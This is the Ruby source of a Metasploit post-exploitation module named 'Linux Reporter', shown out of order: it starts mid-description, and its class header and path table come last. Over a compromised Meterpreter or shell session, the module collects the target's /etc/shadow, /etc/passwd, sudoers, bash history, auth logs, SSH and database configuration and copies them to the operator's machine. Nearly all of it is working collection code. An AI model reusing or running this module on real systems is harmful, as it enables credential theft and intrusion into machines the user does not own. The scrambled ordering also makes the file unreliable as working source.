cf the files to console (default: false)

                Notes:
                - If the report directory already exists, a numbered suffix (_1, _2, etc.) will be added automatically.
                - Only categories specified in CATEGORIES will be processed.
                - Some files may require root privileges; errors will be reported but processing continues.
                },
                'License'     => MSF_LICENSE,
                'Author'      => [ 'Name <email@Reporter.com>' ],
                'Platform'    => [ 'linux' ],
                'SessionTypes'=> [ 'shell', 'meterpreter' ],
                'Notes'       => {
                'Stability'   => [ CRASH_SAFE ],
                'Reliability' => [],
                'SideEffects' => []
                }
            )
        )
        
        register_options([
            OptPath.new('PATHS_FILE', [false, 'File with custom paths to search']),
            OptString.new('OUTPUT_DIR', [false, 'Directory where reports will be saved', '~/Documents']),
            OptString.new('REPORT_NAME', [false, 'Custom report name (default: timestamp)','linux_report']),
            OptString.new('CATEGORIES', [false, 'Comma-separated list of categories (default: all)']),
            OptBool.new('PRINT_CONTENT', [false, 'Also print file contents to console', false])

        ])
    end

    def run 
        user_paths= load_paths()
        paths= DEFAULT_PATHS.merge(user_paths)
        report_name = datastore['REPORT_NAME'] || "linux_report_#{Time.now.strftime('%Y%m%d_%H%M%S')}"

        save_files(paths)
        if datastore['PRINT_CONTENT']
            print_result(paths)
        end
    end


    private

    # Prints the results of reading files from specified paths, grouped by category.
    #
    # @param paths [Hash{Symbol => Hash{String => String}}]
    #   A hash where each key is a category (as a Symbol), and each value is a hash
    #   mapping file names to their file paths.
    #
    # Processes only the categories specified in the 'CATEGORIES' datastore option,
    # or all categories if not set. For each file in the selected categories, attempts
    # to read its content using `safe_read`. If successful, prints the content; otherwise,
    # prints an error message.
    def print_result(paths)
        #Only process categories user selected (or all if not set)
        selected = datastore['CATEGORIES'] ? datastore['CATEGORIES'].split(',').map(&:to_sym) : paths.keys

        selected.each do |category|
            files = paths[category] || {}
            files.each do |name, path|
                content = safe_read(path, category.to_s.upcase)
                if content
                    print_good("[#{category}] #{path}:")
                    print_line(content)
                else
                    print_error("Error reading #{path} (#{category.to_s.upcase})")
                end
            end
        end
    end


    # Loads custom file paths from a specified file in the datastore.
    #
    # If the 'PATHS_FILE' option is set in the datastore, this method reads each line
    # from the file, strips whitespace, and adds non-empty paths to a hash with the
    # basename as the key and the full path as the value.
    #
    # Returns a hash with a :custom key containing the loaded paths, or an empty hash
    # if the file cannot be read or 'PATHS_FILE' is not set.
    #
    # @return [Hash] Hash containing custom paths or empty hash on error.
    def load_paths
        if datastore['PATHS_FILE']
            file = datastore['PATHS_FILE']
            print_status("Loading custom paths from #{file}")
            begin
                custom_paths = {}
                File.foreach(file) do |line|
                    path = line.strip
                    next if path.empty?
                    name = File.basename(path)
                    custom_paths[name] = path
                end

                return { custom: custom_paths }
            rescue => e
                print_error("Could not read paths file: #{e}")
                return {}
            end
        end
        return{}
    end

   


    # Saves files from remote paths to a local report directory, organized by category.
    #
    # @param [Hash] paths
    #   A hash where keys are category symbols and values are hashes mapping file names to remote file paths.
    #
    # The method determines which categories to process based on the 'CATEGORIES' value in the datastore.
    # For each file in the selected categories:
    #   - If the session is Meterpreter, attempts to download the file using `session.download_file`.
    #   - Otherwise, reads the file content using `safe_read` and writes it locally.
    # Files are saved under a directory named after 'REPORT_NAME' in the datastore.
    # Prints status and the total number of files saved.
    def save_files(paths)
        report_name=datastore['REPORT_NAME']
        reporter_path=create_report_dir(report_name)
        total_saved = 0

        selected = datastore['CATEGORIES'] ? datastore['CATEGORIES'].split(',').map(&:to_sym) : paths.keys

        selected.each do |category|
            files = paths[category] || {}
            files.each do |name, path|
                local_path = File.join(reporter_path, category.to_s, "#{name}.txt")
                FileUtils.mkdir_p(File.dirname(local_path))

                if session.type == "meterpreter"
                    # Meterpreter: use download_file
                    if session.fs.file.exist?(path)
                        begin
                            session.download_file(path, local_path)
                            total_saved += 1
                        rescue => e
                            print_error("Failed to download #{path}: #{e}")
                        end
                    end
                else
                    # Command Shell: use read_file
                    content = safe_read(path, category.to_s.upcase)
                    if content
                        File.open(local_path, "w") { |f| f.puts content }
                        total_saved += 1
                    end
                end
            end
        end

        print_status("#{report_name} saved locally to #{reporter_path}")
        print_good("Total files saved: #{total_saved}")
    end



    # Creates a directory for storing a report under the user's Documents folder.
    #
    # The directory path is constructed as ~/Documents/reporter/<report_name>, or a custom
    # output directory if specified in the datastore['OUTPUT_DIR'] option. If the directory
    # already exists, a numeric suffix is appended to avoid overwriting.
    #
    # @param report_name [String] The name of the report directory to create.
    # @return [String] The full path to the created report directory.
    #
    # @note The method determines the real user by checking ENV["SUDO_USER"] or ENV["USER"].
    # @note Handles duplicate report names by appending a numeric suffix.
    def create_report_dir(report_name)
        # Determine real user "/home/ebu/"???????????????
        #                       do i want this
        real_user = ENV["SUDO_USER"] || ENV["USER"]
       

        # Base path in ~/Documents
        base_dir = datastore['OUTPUT_DIR'] || File.join("/home", real_user, "Documents")
        if base_dir.start_with?("~")
            base_dir = File.join("/home", real_user, base_dir[1..])
        end
        
        documents_dir = File.expand_path(base_dir)   # expands "~"
        reporter_path = File.join(documents_dir, "reporter", report_name)

        print_status("Creating reporter directory at: #{reporter_path}")
        # Handle duplicate report names
        if Dir.exist?(reporter_path)
            i = 1
            while Dir.exist?("#{reporter_path}_#{i}")
                i += 1
            end
            reporter_path = "#{reporter_path}_#{i}"
            puts "Report name exists. Using: #{File.basename(reporter_path)}"
        else
            puts "Reporter folder does not exist yet. It will be created."
        end
        FileUtils.mkdir_p(reporter_path)
        reporter_path  

    end


     
    # Safely reads the contents of a file and returns the stripped content.
    # If an error occurs during reading, logs an error message with the file path and label,
    # and returns nil.
    #
    # @param file_path [String] The path to the file to be read.
    # @param label [String] A label used for error reporting.
    # @return [String, nil] The stripped contents of the file, or nil if reading fails.
    def safe_read(file_path,label)
        begin
            content = read_file(file_path)
            return content.strip if content
        rescue => e
            print_error("Could not read #{file_path} (#{label}): #{e}")
        end
        nil 
    end
end
lass MetasploitModule < Msf::Post
    include Msf::Post::File
    include Msf::Post::Linux::System

    DEFAULT_PATHS = {
    Os: {
      os_release: '/etc/os-release',
      proc_version: '/proc/version',
      lsb_release: '/etc/lsb-release',
      issue: '/etc/issue'
    },
    Hardware: {
      cpuinfo: '/proc/cpuinfo',
      meminfo: '/proc/meminfo',
      dmi_product: '/sys/class/dmi/id/product_name',
      dmi_vendor: '/sys/class/dmi/id/sys_vendor'
    },
    Network: {
      hostname: '/etc/hostname',
      hosts: '/etc/hosts',
      arp: '/proc/net/arp',
      route: '/proc/net/route',
      resolv: '/etc/resolv.conf'
    },
    User: {
      passwd: '/etc/passwd',
      shadow: '/etc/shadow',
      group: '/etc/group',
      sudoers: '/etc/sudoers',
      bash_history: File.join(ENV['HOME'] || '/root', '.bash_history')
    },
    Configuration: { 
        sysctl: '/etc/sysctl.conf',
        fstab: '/etc/fstab',
        profile: '/etc/profile',
        bashrc: '/etc/bash.bashrc',
        motd: '/etc/motd',
        ssh_config: '/etc/ssh/sshd_config',
        cron: '/etc/crontab',
        apache: '/etc/apache2/apache2.conf',
        nginx: '/etc/nginx/nginx.conf',
        mysql: '/etc/mysql/my.cnf',
        postgresql: '/etc/postgresql/postgresql.conf',
    },
    Logs: {
        auth_log: '/var/log/auth.log', 
        syslog: '/var/log/syslog',
        dmesg: '/var/log/dmesg',
        kern_log: '/var/log/kern.log',
        apache_log: '/var/log/apache2/access.log',
        nginx_log: '/var/log/nginx/access.log',
        mysql_log: '/var/log/mysql/error.log',
        postgresql_log: '/var/log/postgresql/postgresql.log'
    }
    
  }.freeze
    

    def initialize(info = {})
        super(
            update_info(
                info,
                'Name'        => 'Linux Reporter',
                'Description' => %q{
                Linux Reporter Post Module

                This module collects system information and configuration files from a Linux target. 
                It supports both Meterpreter and command shell sessions. The module organizes the 
                collected data into categories and saves them locally in a structured report 
                directory under the user's Documents folder (or a custom location).

                Categories:
                - Os            : OS release and kernel information
                - Hardware      : CPU, memory, and system vendor details
                - Network       : Hostname, routing, ARP, and DNS info
                - User          : User accounts, groups, sudoers, bash history
                - Configuration : System configuration files (sysctl, fstab, ssh, cron, web server, databases)
                - Logs          : System and service logs
                - Custom        : Any paths provided via PATHS_FILE

                Usage:

                1. Save all categories to the default location without printing:
                set PRINT_CONTENT false
                run

                2. Save only specific categories (e.g., OS and User) to a custom directory:
                set OUTPUT_DIR /home/<your_user>/Desktop
                set CATEGORIES Os,User
                set PRINT_CONTENT false
                run

                3. Print the contents of files for selected categories without saving:
                set CATEGORIES Os,Network
                set PRINT_CONTENT true
                run

                4. Load custom paths from a file:
                set PATHS_FILE /home/<your_user>/custom_paths.txt
                set CATEGORIES custom
                run

                Options:

                - PATHS_FILE   : Optional file containing custom paths to collect
                - OUTPUT_DIR   : Directory where the report will be saved (default: ~/Documents)
                - REPORT_NAME  : Custom report name (default: linux_report_<timestamp>)
                - CATEGORIES   : Comma-separated list of categories to save or print (default: all)
                - PRINT_CONTENT: Boolean, whether to print the contents o
